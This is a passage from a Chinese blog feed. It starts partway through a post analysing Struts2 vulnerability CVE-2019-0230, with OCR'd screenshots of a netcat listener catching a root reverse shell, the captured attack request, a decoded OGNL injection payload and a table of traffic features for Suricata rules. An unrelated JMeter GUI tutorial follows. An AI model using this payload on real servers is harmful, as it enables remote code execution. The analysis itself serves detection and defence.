34465592192.168.1.12%22%7D%2C%7B%22x%22%3A1186.3723%2C%22y%22%3A209.12682%2C%22width%22%3A69.56829999999991%2C%22height%22%3A14.664559999999994%2C%22text%22%3A%226666%5BACK%22%7D%2C%7B%22x%22%3A1107.7002%2C%22y%22%3A209.32347%2C%22width%22%3A62.14480000000003%2C%22height%22%3A14.836810000000014%2C%22text%22%3A%226641734%22%7D%2C%7B%22x%22%3A877.2012%2C%22y%22%3A209.33871%2C%22width%22%3A95.99120000000005%2C%22height%22%3A14.173220000000015%2C%22text%22%3A%22192.168.1.129%22%7D%2C%7B%22x%22%3A183.9223%2C%22y%22%3A214.04546%2C%22width%22%3A236.12685999999997%2C%22height%22%3A15.81871000000001%2C%22text%22%3A%22kaliakali%3Almy%24nc-lvvp6666%22%7D%2C%7B%22x%22%3A603.65765%2C%22y%22%3A222.11298%2C%22width%22%3A214.77790000000005%2C%22height%22%3A16.087310000000002%2C%22text%22%3A%224523.534465643192168.1.12%22%7D%2C%7B%22x%22%3A876.2743%2C%22y%22%3A222.89088%2C%22width%22%3A101.90419999999995%2C%22height%22%3A14.73811999999998%2C%22text%22%3A%22192.168.1.129%22%7D%2C%7B%22x%22%3A1106.2363%2C%22y%22%3A223.19327%2C%22width%22%3A66.04250000000002%2C%22height%22%3A14.508539999999982%2C%22text%22%3A%226641736%22%7D%2C%7B%22x%22%3A1029.21%2C%22y%22%3A223.18568%2C%22width%22%3A25.41820000000007%2C%22height%22%3A13.669540000000012%2C%22text%22%3A%22TCP%22%7D%2C%7B%22x%22%3A1182.7107%2C%22y%22%3A223.76201%2C%22width%22%3A39.46370000000002%2C%22height%22%3A13.979479999999995%2C%22text%22%3A%226666%22%7D%2C%7B%22x%22%3A184.15791%2C%22y%22%3A230.1585%2C%22width%22%3A192.45504000000003%2C%22height%22%3A14.400669999999991%2C%22text%22%3A%22listeningon%5Bany%5D6666%22%7D%2C%7B%22x%22%3A183.63739%2C%22y%22%3A244.32205%2C%22width%22%3A373.25871000000006%2C%22height%22%3A16.36328000000003%2C%22text%22%3A%22192.168.1.12%3AinversehostookupaieUnk%22%7D%2C%7B%22x%22%3A187.14777%2C%22y%22%3A260.29333%2C%22width%22%3A369.47966999999994%2C%22height%22%3A18.458499999999958%2C%22text%22%3A%22CONNcT1921681oNN%22%7D%2C%7B%22x%22%3A185.32877%2C%22y%22%3A276.54135%2C%22width%22%3A369.08877000000007%2C%22height%22%3A18.506989999999973%2C%22text%22%3A%22bash%3Acannotserterinalorocessgroup()%3A%22%7D%2C%7B%22x%22%3A185.26056%2C%22y%22%3A295.56604%2C%22width%22%3A276.94641%2C%22height%22%3A14.29349000000002%2C%22text%22%3A%22bash%3Anojobcontrolinthissheit%22%7D%2C%7B%22x%22%3A184.56996%2C%22y%22%3A310.00137%2C%22width%22%3A228.18218%2C%22height%22%3A15.822909999999979%2C%22text%22%3A%22Rootac6202913F%2FUSR%2FSRc%23%22%7D%5D%2C%22style%22%3A%22none%22%2C%22search%22%3A%22hLokli%3B%20Go%20Edit%20Analyze%20Help%20FILEACTIONSEDITVIEW%20HelP%20View%20HelP%20katiakali%3Ac%2Foysnc-Lwvp6666%20listeningonlany%5D6666...%20Jip.addr--192.168.1.12%20192.168.1.1inversehostlookupfaled%3AUnkn%20ad.py%20connectto192168.1.19%5DFrom(UNNOw19%20ProtocolLengttlnfo%20Source%20Python3PayLoad.py%20bash%3Acannotseterminlrocessgroup)%20382352544973219216811%206430528880%20bash%3AnoJobcontrolinthissheit%2074417346666YNj%20283%3A33828088.%20608%20rootac6e8202913f%2Fssrchoam%20TCP%204123533801025192168119%20192168.1.12%20whoaml%207441736666GSYN%5D%20%E5%90%8D%E8%B4%B95%E6%9C%8888828%20192.168.1.129%20Poot%2074666641736%20192168.1.12%20rOTAC6E82029139F%2FUR%2FSRCC%20sent7%2Crcvd17%204423.534465592192.168.1.12%206666%5BACK%206641734%20192.168.1.129%20kaliakali%3Almy%24nc-lvvp6666%204523.534465643192168.1.12%20192.168.1.129%206641736%20TCP%206666%20listeningon%5Bany%5D6666%20192.168.1.12%3AinversehostookupaieUnk%20CONNcT1921681oNN%20bash%3Acannotserterinalorocessgroup()%3A%20bash%3Anojobcontrolinthissheit%20Rootac6202913F%2FUSR%2FSRc%23%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22width%22%3A648%2C%22height%22%3A178%7D&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/262404/1604331538859-27d33393-af0c-4542-b96b-a3fee2d29c10.png&quot; alt=&quot;image.png&quot; class=&quot;image lake-drag-image&quot; title=&quot;image.png&quot; data-role=&quot;image&quot; data-raw-src=&quot;&quot; data-height=&quot;178px&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p data-lake-id=&quot;7337967ba8dcca992c7ed64fe1d2814b&quot;&gt;&lt;span class=&quot;lake-card-margin-top lake-card-margin-bottom lake-selected&quot; data-card-type=&quot;inline&quot; data-lake-card=&quot;image&quot; data-card-value=&quot;data:%7B%22src%22%3A%22https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2020%2Fpng%2F262404%2F1604332378455-66de17ea-0046-4283-b748-755de5f609c7.png%22%2C%22originWidth%22%3A1677%2C%22originHeight%22%3A866%2C%22name%22%3A%22image.png%22%2C%22size%22%3A105146%2C%22display%22%3A%22inline%22%2C%22align%22%3A%22left%22%2C%22linkTarget%22%3A%22_blank%22%2C%22status%22%3A%22done%22%2C%22ocrLocations%22%3A%5B%7B%22x%22%3A9.088444%2C%22y%22%3A14.418555%2C%22width%22%3A40.303267999999996%2C%22height%22%3A20.587728000000006%2C%22text%22%3A%22POST%22%7D%2C%7B%22x%22%3A69.88883%2C%22y%22%3A16.544067%2C%22width%22%3A90.13362%2C%22height%22%3A18.221341000000002%2C%22text%22%3A%22HTTP%2F1.1%22%7D%2C%7B%22x%22%3A12.263203%2C%22y%22%3A37.902706%2C%22width%22%3A241.637177%2C%22height%22%3A17.883578999999997%2C%22text%22%3A%22HOst%3A192%3A168.1.12%3A8086%22%7D%2C%7B%22x%22%3A6.1535735%2C%22y%22%3A58.785732%2C%22width%22%3A347.1282265%2C%22height%22%3A19.823322999999995%2C%22text%22%3A%22userAgent%3Apython-requests%2F2.23.%22%7D%2C%7B%22x%22%3A6.8564377%2C%22y%22%3A81.69317%2C%22width%22%3A309.4725623%2C%22height%22%3A19.571030000000007%2C%22text%22%3A%22Acccpt-Encodingsgzip%2Cdefiate%22%7D%2C%7B%22x%22%3A7.3082185%2C%22y%22%3A104.43822%2C%22width%22%3A126.42675150000001%2C%22height%22%3A16.61613%2C%22text%22%3A%22AcCePt%3A*I%22%7D%2C%7B%22x%22%3A6.725426%2C%22y%22%3A126.07472%2C%22width%22%3A216.917194%2C%22height%22%3A19.22028999999999%2C%22text%22%3A%22comnectiongkeep-aliwe%22%7D%2C%7B%22x%22%3A6.175289%2C%22y%22%3A148.63615%2C%22width%22%3A224.699501%2C%22height%22%3A18.967780000000005%2C%22text%22%3A%22content-length%3A768%22%7D%2C%7B%22x%22%3A6.4386506%2C%22y%22%3A165.79419%2C%22width%22%3A481.9310494%2C%22height%22%3A23.588550000000026%2C%22text%22%3A%22Contenl-Type%3Aapplicalion%2Fx-wfor-urlencoded%22%7D%2C%7B%22x%22%3A12.8131%2C%22y%22%3A213.43248%2C%22width%22%3A1634.9334999999999%2C%22height%22%3A19.948290000000014%2C%22text%22%3A%22%E4%B8%AD%E5%92%8C%E5%BF%83%22%7D%2C%7B%22x%22%3A6.8150606%2C%22y%22%3A234.33812%2C%22width%22%3A1480.4812394%2C%22height%22%3A23.329979999999978%2C%22text%22%3A%22%E4%B8%AD%E5%BF%83%22%7D%2C%7B%22x%22%3A6.532885%2C%22y%22%3A256.7528%2C%22width%22%3A727.900645%2C%22height%22%3A23.912270000000035%2C%22text%22%3A%227873nutilxuk%22%7D%2C%7B%22x%22%3A5.6585402%2C%22y%22%3A279.8304%2C%22width%22%3A350.7325098%2C%22height%22%3A22.530039999999985%2C%22text%22%3A%22B8L%3AHon%2C02Hov202015.206000M1%22%7D%2C%7B%22x%22%3A5.702213%2C%22y%22%3A301.38168%2C%22width%22%3A232.591087%2C%22height%22%3A21.675749999999994%2C%22text%22%3A%22content-Languageien%22%7D%2C%7B%22x%22%3A7.2158017%2C%22y%22%3A321.7316%2C%22width%22%3A420.4585483%2C%22height%22%3A22.681029999999964%2C%22text%22%3A%22Content-lype%3Atext%2Fhtal.charset-utf-8%22%7D%2C%7B%22x%22%3A7.1966634%2C%22y%22%3A344.89478%2C%22width%22%3A674.1494066%2C%22height%22%3A20.284179999999992%2C%22text%22%3A%22Set.cookie%3AJsEssoNpodexft%22%7D%2C%7B%22x%22%3A7.6934576%2C%22y%22%3A366.3878%2C%22width%22%3A515.2087424%2C%22height%22%3A19.898799999999994%2C%22text%22%3A%22xpires%3Athue1Jan197900%3A90%3A06GMT%22%7D%2C%7B%22x%22%3A8.022907%2C%22y%22%3A389.57367%2C%22width%22%3A225.531843%2C%22height%22%3A19.37781000000001%2C%22text%22%3A%22Corilenl-LengLh%3A497%22%7D%2C%7B%22x%22%3A8.134793%2C%22y%22%3A411.87238%2C%22width%22%3A313.116507%2C%22height%22%3A22.30867999999998%2C%22text%22%3A%22serveriJetty(9.1.31.V20200723)%22%7D%2C%7B%22x%22%3A7.9298644%2C%22y%22%3A519.3576%2C%22width%22%3A61.13189560000001%2C%22height%22%3A20.76679999999999%2C%22text%22%3A%22chtal%3E%22%7D%2C%7B%22x%22%3A5.9359655%2C%22y%22%3A540.91595%2C%22width%22%3A112.6447005%2C%22height%22%3A20.98700000000008%2C%22text%22%3A%22chead%3E%22%7D%2C%7B%22x%22%3A38.196903%2C%22y%22%3A562.39014%2C%22width%22%3A274.18114699999995%2C%22height%22%3A23.763959999999997%2C%22text%22%3A%22stitless2059demosltitle%3E%22%7D%2C%7B%22x%22%3A9.536848%2C%22y%22%3A608.4784%2C%22width%22%3A65.325882%2C%22height%22%3A19.35239999999999%2C%22text%22%3A%22%2Fhead%22%7D%2C%7B%22x%22%3A5.0967073%2C%22y%22%3A632.2095%2C%22width%22%3A91.99148869999999%2C%22height%22%3A20.84999999999991%2C%22text%22%3A%22%3Cbody2%22%7D%2C%7B%22x%22%3A8.470497%2C%22y%22%3A648.33746%2C%22width%22%3A1379.610303%2C%22height%22%3A25.471070000000054%2C%22text%22%3A%22.%22%7D%2C%7B%22x%22%3A11.517072%2C%22y%22%3A673.6393%2C%22width%22%3A1539.3970279999999%2C%22height%22%3A23.445299999999975%2C%22text%22%3A%22%E5%9C%B0%E4%B8%AD%E5%BF%83)%22%7D%2C%7B%22x%22%3A10.774984%2C%22y%22%3A698.0194%2C%22width%22%3A743.886266%2C%22height%22%3A20.720699999999965%2C%22text%22%3A%22uomnlutil.settxcludedclasses.toluti.exk%22%7D%2C%7B%22x%22%3A37.87506%2C%22y%22%3A721.89056%2C%22width%22%3A481.9364%2C%22height%22%3A17.988539999999944%2C%22text%22%3A%22ubrshasbencwaluatedzgainindattrlbutea%22%7D%2C%7B%22x%22%3A8.652291%2C%22y%22%3A741.5804%2C%22width%22%3A78.649459%2C%22height%22%3A21.055099999999925%2C%22text%22%3A%22%3C%2Fhodyo%22%7D%2C%7B%22x%22%3A6.6752577%2C%22y%22%3A763.9671%2C%22width%22%3A73.8302963%2C%22height%22%3A19.03394000000003%2C%22text%22%3A%22%3C%2Fhtmi%22%7D%5D%2C%22style%22%3A%22none%22%2C%22search%22%3A%22POST%20HTTP%2F1.1%20HOst%3A192%3A168.1.12%3A8086%20userAgent%3Apython-requests%2F2.23.%20Acccpt-Encodingsgzip%2Cdefiate%20AcCePt%3A*I%20comnectiongkeep-aliwe%20content-length%3A768%20Contenl-Type%3Aapplicalion%2Fx-wfor-urlencoded%20%E4%B8%AD%E5%92%8C%E5%BF%83%20%E4%B8%AD%E5%BF%83%207873nutilxuk%20B8L%3AHon%2C02Hov202015.206000M1%20content-Languageien%20Content-lype%3Atext%2Fhtal.charset-utf-8%20Set.cookie%3AJsEssoNpodexft%20xpires%3Athue1Jan197900%3A90%3A06GMT%20Corilenl-LengLh%3A497%20serveriJetty(9.1.31.V20200723)%20chtal%3E%20chead%3E%20stitless2059demosltitle%3E%20%2Fhead%20%3Cbody2%20.%20%E5%9C%B0%E4%B8%AD%E5%BF%83)%20uomnlutil.settxcludedclasses.toluti.exk%20ubrshasbencwaluatedzgainindattrlbutea%20%3C%2Fhodyo%20%3C%2Fhtmi%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22width%22%3A838.5%2C%22height%22%3A433%7D&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/262404/1604332378455-66de17ea-0046-4283-b748-755de5f609c7.png&quot; alt=&quot;image.png&quot; class=&quot;image lake-drag-image&quot; title=&quot;image.png&quot; data-role=&quot;image&quot; data-raw-src=&quot;&quot; data-height=&quot;433px&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p data-lake-id=&quot;f4e5fb5872963e9ba19135635e66c42f&quot;&gt;从攻击数据包里可以很清楚的看到，攻击者通过id值=xxx，来传入恶意的payload，&lt;/p&gt;
&lt;p data-lake-id=&quot;c59a85d9e87b44841daa144da681bad9&quot;&gt;其中 %25是 % ，%7B是{，%7D是}&lt;/p&gt;
&lt;p data-lake-id=&quot;d956792a23ab939b0e672fa00600dc57&quot;&gt;而请求包中包含payload，例如suricata规则中可以用content来匹配。&lt;/p&gt;
&lt;p data-lake-id=&quot;c84ade35e0a0de829eda5f4adaf2eb2c&quot;&gt;我们还是先对发送包进行URL解码:&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
id=%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}
&lt;/pre&gt;&lt;/div&gt;

&lt;div id=&quot;k1gnn&quot; class=&quot;lake-card-margin lake-selected&quot; data-card-type=&quot;block&quot; data-lake-card=&quot;codeblock&quot; data-card-value=&quot;data:%7B%22mode%22%3A%22bash%22%2C%22code%22%3A%22id%3D%25%7B(%23context%3D%23attr%5B'struts.valueStack'%5D.context).(%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.setExcludedClasses('')).(%23ognlUtil.setExcludedPackageNames(''))%7D%22%2C%22heightLimit%22%3Atrue%2C%22margin%22%3Atrue%2C%22id%22%3A%22k1gnn%22%2C%22autoWrap%22%3Atrue%7D&quot; data-language=&quot;bash&quot;&gt;
&lt;div class=&quot;lake-codeblock-content&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;CodeMirror-sizer&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;cm-s-default&quot;&gt;
&lt;span class=&quot;lake-preview-line&quot;&gt;&lt;span class=&quot;lake-preview-line-number lake-lm-pad-level-0&quot;&gt;&lt;span class=&quot;lake-preview-codeblock-content&quot;&gt;&lt;span class=&quot;cm-def&quot;&gt;这样就很清晰了，可以得到双向规则，来防护这个漏洞的攻击。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;soWFv&quot; class=&quot;lake-card-margin lake-selected&quot; data-card-type=&quot;block&quot; data-lake-card=&quot;table&quot; data-card-value=&quot;data:%7B%22rows%22%3A8%2C%22cols%22%3A2%2C%22html%22%3A%22%3Ctable%20class%3D%5C%22lake-table%5C%22%20style%3D%5C%22width%3A%20741px%3B%5C%22%3E%3Ccolgroup%3E%3Ccol%20width%3D%5C%22240%5C%22%20span%3D%5C%221%5C%22%20%2F%3E%3Ccol%20width%3D%5C%22501%5C%22%20span%3D%5C%221%5C%22%20%2F%3E%3C%2Fcolgroup%3E%3Ctbody%3E%3Ctr%20style%3D%5C%22height%3A%2033px%3B%5C%22%3E%3Ctd%3E%3Cp%20data-lake-id%3D%5C%22bad29fa0bf278370e3b852bc79a93ff2%5C%22%3E%E7%89%B9%E5%BE%81%3C%2Fp%3E%3C%2Ftd%3E%3Ctd%3E%3Cp%20data-lake-id%3D%5C%22466cd1a27835f10546828e07d1b2643d_p_0%5C%22%3E%E8%AF%B4%E6%98%8E%3C%2Fp%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%20style%3D%5C%22height%3A%2033px%3B%5C%22%3E%3Ctd%3E%3Cp%20data-lake-id%3D%5C%22e389fe553c73f915b078507aeb8a2ad2%5C%22%3EPOST%E6%96%B9%E5%BC%8F%3C%2Fp%3E%3C%2Ftd%3E%3Ctd%3E%3Cp%20data-lake-id%3D%5C%224b5240534c623a703dc7dc029a724b54%5C%22%3Ehttp.method%3DPOST%3C%2Fp%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%20style%3D%5C%22height%3A%2033px%3B%5C%22%3E%3Ctd%20colspan%3D%5C%221%5C%22%20style%3D%5C%22vertical-align%3A%20top%3B%20background-color%3A%20%23FFFFFF%3B%20color%3A%20%23404040%3B%5C%22%3E%3Cp%20data-lake-id%3D%5C%22a20d224c568e48b9d67847a2c66a8c01_p_0%5C%22%3E%E7%8A%B6%E6%80%81%E7%A0%81%20200%3C%2Fp%3E%3C%2Ftd%3E%3Ctd%20colspan%3D%5C%221%5C%22%20style%3D%5C%22vertical-align%3A%20top%3B%20background-color%3A%20%23FFFFFF%3B%20color%3A%20%23404040%3B%5C%22%3E%3Cp%20data-lake-id%3D%5C%22a4dda04fbb0fc86f7ad3fc1501e554f7%5C%22%3E%3Cbr%20%2F%3E%3C%2Fp%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%20style%3D%5C%22height%3A%2033px%3B%5C%22%3E%3Ctd%3E%3Cp%20data-lake-id%3D%5C%22b03de967ee2a4c723d241ab4d94393e9%5C%22%3E%E8%AF%B7%E6%B1%82%E5%A4%B4%20%E5%8C%85%E5%90%AB%20%25%3C%2Fp%3E%3C%2Ftd%3E%3Ctd%3E%3Cp%20data-lake-id%3D%5C%22a8f943775a99452e39b22085731567aa%5C%22%3E%3Cbr%20%2F%3E%3C%2Fp%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%20style%3D%5C%22height%3A%2033px%3B%5C%22%3E%3Ctd%20colspan%3D%5C%221%5C%22%3E%3Cp%20data-lake-id%3D%5C%22b03de967ee2a4c723d241ab4d94393e9%5C%22%3E%E8%AF%B7%E6%B1%82%E5%A4%B4%20%E5%8C%85%E5%90%AB%C2%A0%20%C2%A0%7B%3C%2Fp%3E%3C%2Ftd%3E%3Ctd%20colspan%3D%5C%221%5C%22%20style%3D%5C%22vertical-align%3A%20top%3B%20background-color%3A%20%23FFFFFF%3B%20color%3A%20%23404040%3B%5C%22%3E%3Cp%20data-lake-id%3D%5C%2242a7318086c0c73a8e132dde5500621b%5C%22%3E%3Cbr%20%2F%3E%3C%2Fp%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%20style%3D%5C%22height%3A%2033px%3B%5C%22%3E%3Ctd%20colspan%3D%5C%221%5C%22%3E%3Cp%20data-lake-id%3D%5C%22b03de967ee2a4c723d241ab4d94393e9%5C%22%3E%E8%AF%B7%E6%B1%82%E5%A4%B4%20%E5%8C%85%E5%90%AB%C2%A0%20%C2%A0%7D%3C%2Fp%3E%3C%2Ftd%3E%3Ctd%20colspan%3D%5C%221%5C%22%20style%3D%5C%22vertical-align%3A%20top%3B%20background-color%3A%20%23FFFFFF%3B%20color%3A%20%23404040%3B%5C%22%3E%3Cp%20data-lake-id%3D%5C%221ef362695a12573bd16110cf9cf8f31a%5C%22%3E%3Cbr%20%2F%3E%3C%2Fp%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%20style%3D%5C%22height%3A%2033px%3B%5C%22%3E%3Ctd%20colspan%3D%5C%221%5C%22%20style%3D%5C%22vertical-align%3A%20top%3B%20background-color%3A%20%23FFFFFF%3B%20color%3A%20%23404040%3B%5C%22%3E%3Cp%20data-lake-id%3D%5C%22bc91ce1905542259b4a2767a244df7f8%5C%22%3E%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%8C%85%E5%90%ABpayload%3C%2Fp%3E%3C%2Ftd%3E%3Ctd%20colspan%3D%5C%221%5C%22%20style%3D%5C%22vertical-align%3A%20top%3B%20background-color%3A%20%23FFFFFF%3B%20color%3A%20%23404040%3B%5C%22%3E%3Cp%3E%3Cbr%20%2F%3E%3C%2Fp%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%20style%3D%5C%22height%3A%2033px%3B%5C%22%3E%3Ctd%20colspan%3D%5C%221%5C%22%20style%3D%5C%22vertical-align%3A%20top%3B%20background-color%3A%20%23FFFFFF%3B%20color%3A%20%23404040%3B%5C%22%3E%3Cp%20data-lake-id%3D%5C%220ca5c49545d2267408afe4ad13140197%5C%22%3E%E5%93%8D%E5%BA%94%E5%A4%B4%E5%8C%85%E5%90%ABpayload%3C%2Fp%3E%3C%2Ftd%3E%3Ctd%20colspan%3D%5C%221%5C%22%20style%3D%5C%22vertical-align%3A%20top%3B%20background-color%3A%20%23FFFFFF%3B%20color%3A%20%23404040%3B%5C%22%3E%3Cp%3E%3Cbr%20%2F%3E%3C%2Fp%3E%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftbody%3E%3C%2Ftable%3E%22%2C%22margin%22%3Atrue%2C%22hideBorder%22%3Afalse%2C%22id%22%3A%22soWFv%22%7D&quot;&gt;
&lt;table class=&quot;lake-table&quot;&gt;&lt;colgroup&gt;&lt;col span=&quot;1&quot; width=&quot;240&quot;/&gt;&lt;col span=&quot;1&quot; width=&quot;501&quot;/&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;
&lt;p data-lake-id=&quot;bad29fa0bf278370e3b852bc79a93ff2&quot;&gt;特征&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p data-lake-id=&quot;466cd1a27835f10546828e07d1b2643d_p_0&quot;&gt;说明&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;
&lt;p data-lake-id=&quot;e389fe553c73f915b078507aeb8a2ad2&quot;&gt;POST方式&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p data-lake-id=&quot;4b5240534c623a703dc7dc029a724b54&quot;&gt;http.method=POST&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=&quot;1&quot;&gt;
&lt;p data-lake-id=&quot;a20d224c568e48b9d67847a2c66a8c01_p_0&quot;&gt;状态码 200&lt;/p&gt;
&lt;/td&gt;
&lt;td colspan=&quot;1&quot;&gt;
&lt;p data-lake-id=&quot;a4dda04fbb0fc86f7ad3fc1501e554f7&quot;&gt; &lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;
&lt;p data-lake-id=&quot;b03de967ee2a4c723d241ab4d94393e9&quot;&gt;请求头 包含 %&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p data-lake-id=&quot;a8f943775a99452e39b22085731567aa&quot;&gt; &lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=&quot;1&quot;&gt;
&lt;p data-lake-id=&quot;b03de967ee2a4c723d241ab4d94393e9&quot;&gt;请求头 包含   {&lt;/p&gt;
&lt;/td&gt;
&lt;td colspan=&quot;1&quot;&gt;
&lt;p data-lake-id=&quot;42a7318086c0c73a8e132dde5500621b&quot;&gt; &lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=&quot;1&quot;&gt;
&lt;p data-lake-id=&quot;b03de967ee2a4c723d241ab4d94393e9&quot;&gt;请求头 包含   }&lt;/p&gt;
&lt;/td&gt;
&lt;td colspan=&quot;1&quot;&gt;
&lt;p data-lake-id=&quot;1ef362695a12573bd16110cf9cf8f31a&quot;&gt; &lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=&quot;1&quot;&gt;
&lt;p data-lake-id=&quot;bc91ce1905542259b4a2767a244df7f8&quot;&gt;请求头包含payload&lt;/p&gt;
&lt;/td&gt;
&lt;td colspan=&quot;1&quot;&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=&quot;1&quot;&gt;
&lt;p data-lake-id=&quot;0ca5c49545d2267408afe4ad13140197&quot;&gt;响应头包含payload&lt;/p&gt;
&lt;/td&gt;
&lt;td colspan=&quot;1&quot;&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;
&lt;p data-lake-id=&quot;c0c213a760493a9557c76c6ed97fef66&quot;&gt; &lt;/p&gt;
</description>
<pubDate>Tue, 03 Nov 2020 00:14:00 +0000</pubDate>
<dc:creator>顷刻Minute</dc:creator>
<og:description>一、简介 2020年08月13日，Apache官方发布了Struts2远程代码执行漏洞的风险通告，该漏洞编号为CVE-2019-0230，漏洞等级：高危，漏洞评分：8.5 二、漏洞描述 Struts2</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/x00c/p/13917529.html</dc:identifier>
</item>
<item>
<title>JMeter实战(三) 界面使用 - 测试老树</title>
<link>http://www.cnblogs.com/df888/p/13916455.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/df888/p/13916455.html</guid>
<description>&lt;p&gt;JMeter 有 2 种运行方式，一种是 CLI，一种是 GUI，本篇文章就来介绍一下后者，&lt;strong&gt;图形用户界面&lt;/strong&gt;，因为后续文章大部分都是基于 GUI 的。&lt;/p&gt;
&lt;p&gt;本文演示的是英文版，想用中文的同学可以在菜单栏点击 Choose Language 切换哦：&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205510754-2025408022.png&quot;/&gt;&lt;/center&gt;
&lt;p&gt;启动 &lt;strong&gt;JMeter (5.3 版本)&lt;/strong&gt; 后，会看到这样的界面，共 3 个区域：&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205511172-1615184674.png&quot;/&gt;&lt;/center&gt;
&lt;p&gt;区域 1 是目录树，区域 2 是元件编辑区，区域 3 是工具栏，界面左上角是菜单栏。&lt;/p&gt;

&lt;p&gt;目录树，是一个树状结构的目录，&lt;strong&gt;根节点只有 1 个，叫做测试计划&lt;/strong&gt;。每 1 个测试计划就是 1 个 .jmx 测试脚本。&lt;/p&gt;
&lt;p&gt;在根节点测试计划下，可以添加线程组、配置元素、监听器、定时器、前置处理器、后置处理器、断言、Test Fragment 等：&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205511436-1664475035.png&quot;/&gt;&lt;/center&gt;
&lt;p&gt;在测试计划下，必须添加线程组。因为 JMeter 就是用线程来模拟用户的。&lt;/p&gt;
&lt;p&gt;添加了线程组以后，在线程组下可以添加取样器、逻辑控制器、前置处理器、后置处理器、断言、定时器、Test Fragment、配置元素、监听器：&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205511628-1728958641.png&quot;/&gt;&lt;/center&gt;
&lt;p&gt;&lt;strong&gt;取样器和逻辑控制器在测试计划中不能添加，只能在线程组中添加&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;接着就可以添加其他元件。&lt;/p&gt;
&lt;p&gt;JMeter 在运行时，会从上往下依次遍历元件执行。&lt;/p&gt;

&lt;p&gt;元件编辑区是用来设置元件的。当在左侧目录树选中某个元件后，右侧的编辑区会切换到当前选中元件的编辑项。&lt;/p&gt;
&lt;p&gt;启动 JMeter 后的默认编辑区是测试计划的编辑区，因为启动后只有测试计划根节点。&lt;/p&gt;
&lt;p&gt;编辑区是使用 JMeter 时访问最多的一块区域。&lt;/p&gt;

&lt;p&gt;5.3 版本的默认工具栏相比老版本简化了，更贴合实际使用需求，一共有 24 个：&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205511848-434117869.png&quot;/&gt;&lt;/center&gt;
&lt;ol readability=&quot;13.5&quot;&gt;&lt;li&gt;
&lt;p&gt;新建测试计划&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;基于模板创建测试计划，点击后弹出对话框，选择模板：&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205512050-1028653136.png&quot;/&gt;&lt;/center&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;打开 .jmx 脚本文件&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;保存当前测试计划为 .jmx 脚本文件&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;删除目录树中选中的元件，如果是父节点，那么其子节点也会一同被删除&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
